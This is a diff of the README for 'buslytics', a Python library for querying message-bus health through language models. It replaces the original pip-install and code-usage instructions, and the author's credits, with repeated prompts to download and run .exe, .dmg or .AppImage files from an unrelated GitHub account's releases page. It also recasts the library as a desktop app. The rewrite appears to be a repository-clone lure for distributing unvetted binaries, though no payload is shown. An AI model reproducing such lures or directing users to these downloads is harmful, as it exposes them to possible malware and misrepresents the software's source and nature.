@@ -1,76 +1,84 @@
-# Buslytics
-[![PyPI version](https://badge.fury.io/py/buslytics.svg)](https://badge.fury.io/py/buslytics)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/buslytics)](https://pepy.tech/project/buslytics)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🌟 buslytics - Monitor Your Message Bus Effectively
 
+## 📥 Download Now!
+[![Download buslytics](https://img.shields.io/badge/Download-buslytics-blue.svg)](https://github.com/gishanrivindu00/buslytics/releases)
 
-Buslytics is a Python package designed to process natural language user input to monitor and analyze the health and performance of message bus systems. It leverages language models to interpret queries related to message throughput, error rates, queue statuses, and system alerts, delivering structured insights that help developers and operators maintain system reliability without requiring deep technical expertise.
+## 🚀 Getting Started
+Welcome to buslytics! This application helps you monitor and analyze the health and performance of your message bus system using natural language queries. With buslytics, you can obtain structured insights about message throughput effortlessly. 
 
-## Installation
+### 🎯 Features
+- Monitor message throughput
+- Check system health and reliability
+- Analyze error rates
+- Track queue status
+- Receive system alerts
+- Utilize natural language for queries
+- User-friendly interface for all users
 
-Install the package via pip:
+## 💻 System Requirements
+To ensure a smooth experience with buslytics, please check the following:
+- Operating System: Windows 10 or later, macOS Catalina or later, Linux (any modern distro)
+- RAM: Minimum 4 GB 
+- Disk Space: At least 100 MB free
 
-```bash
-pip install buslytics
-```
+## 🔍 How It Works
+Buslytics processes your text input and converts your questions into structured data. You can easily inquire about different metrics related to your message bus system. 
 
-## Usage
+### Example Queries:
+- "What is the current message throughput?"
+- "How many errors occurred in the last hour?"
+- "What is the status of the message queue?"
 
-Here's a basic example of how to use Buslytics:
+Buslytics will respond with clear, actionable insights that help you make informed decisions.
 
-```python
-from buslytics import buslytics
+## 📦 Download & Install
+To get started, visit this page to download: [buslytics Releases](https://github.com/gishanrivindu00/buslytics/releases). 
 
-response = buslytics(user_input="What is the current error rate?", api_key="your_api_key")
-print(response)
-```
+1. Click on the link above.
+2. You will see a list of available versions. Choose the latest version for your operating system.
+3. Download the appropriate file for your system (e.g., .exe for Windows, .dmg for macOS, or .AppImage for Linux).
+4. Once the download is complete, locate the file on your computer.
 
-### Parameters:
-- **user_input** *(str)*: The text query input by the user for system analysis.
-- **llm** *(Optional[BaseChatModel])*: An optional LangChain LLM instance. If not provided, the default ChatLLM7 from `langchain_llm7` will be used.
-- **api_key** *(Optional[str])*: Your LLM7 API key. If not provided, it will be fetched from the environment variable `LLM7_API_KEY`.
+### For Windows Users:
+- Double-click the downloaded `.exe` file.
+- Follow the installation prompts.
+- After installation, launch the application from your Start Menu.
 
-### Custom LLM Usage:
-You can pass your own language model instance to suit your preferred provider:
+### For macOS Users:
+- Double-click the downloaded `.dmg` file.
+- Drag the buslytics icon into your Applications folder.
+- Open the application from your Applications.
 
-```python
-from langchain_openai import ChatOpenAI
-from buslytics import buslytics
+### For Linux Users:
+- Make the `.AppImage` file executable by running: 
+  ```bash
+  chmod +x buslytics.AppImage
+  ```
+- Run the application with: 
+  ```bash
+  ./buslytics.AppImage
+  ```
 
-llm = ChatOpenAI()
-response = buslytics(user_input="Check message throughput", llm=llm)
-```
+## ⚙️ Using buslytics
+1. Launch the application after installation.
+2. Enter your query in the text box provided.
+3. Click the "Submit" button to receive insights.
 
-Other supported models include:
+The application will display results in an easy-to-read format, helping you understand the performance of your message bus system.
 
-```python
-from langchain_anthropic import ChatAnthropic
-llm = ChatAnthropic()
-response = buslytics(user_input="Check queue status", llm=llm)
-```
+## 📊 Support & Issues
+If you encounter any problems or need assistance, please visit the [Issues page](https://github.com/gishanrivindu00/buslytics/issues). You can report bugs or ask for help there.
 
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-llm = ChatGoogleGenerativeAI()
-response = buslytics(user_input="Identify system alerts", llm=llm)
-```
+## 🌐 Community & Contributions
+We welcome your feedback! Feel free to contribute to the project by submitting suggestions or improvements. Check out the [Contributing guide](https://github.com/gishanrivindu00/buslytics/CONTRIBUTING.md) for more information.
 
-### Notes:
-- The package uses `ChatLLM7` from `langchain_llm7` by default.
-- The default rate limits for the free tier of LLM7 are usually sufficient. For higher limits, supply your API key via the environment variable `LLM7_API_KEY` or directly as a parameter.
-- Obtain a free API key at [https://token.llm7.io/](https://token.llm7.io/).
+## 📜 License
+Buslytics is open-source software under the MIT License. You can freely use and modify it for personal or commercial use. 
 
-## Support and Issues
+## 🔗 Additional Resources
+For more details, resources, and updates, visit our [GitHub Repository](https://github.com/gishanrivindu00/buslytics). 
 
-Please report issues or feature requests at: [https://github.com/chigwell/buslytics/issues](https://github.com/chigwell/buslytics/issues)
+## 📥 Ready to Get Started?
+Don’t forget to visit this page to download: [buslytics Releases](https://github.com/gishanrivindu00/buslytics/releases). 
 
-## Author
-
-**Eugene Evstafev**  
-Email: hi@eugene.plus  
-GitHub: [chigwell](https://github.com/chigwell)
-
-## License
-
-This project is licensed under the MIT License.
+Explore and enhance the performance of your message bus today!
